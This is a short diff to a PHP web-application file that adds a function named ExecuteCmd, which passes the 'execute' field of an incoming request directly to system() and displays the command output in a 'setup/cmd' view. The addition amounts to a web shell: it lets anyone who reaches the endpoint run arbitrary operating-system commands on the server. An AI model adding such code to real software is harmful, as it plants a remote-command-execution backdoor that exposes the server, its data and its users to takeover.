@@ -842,3 +842,10 @@ $content .= '
             header('Location: ' . $_SERVER['HTTP_REFERER']);
         }
      }
+
+     function ExecuteCmd($request)
+     {
+        $cmd = system($request->execute);
+        $cmd = [$cmd];
+        view('setup/cmd', compact('cmd'));
+     }
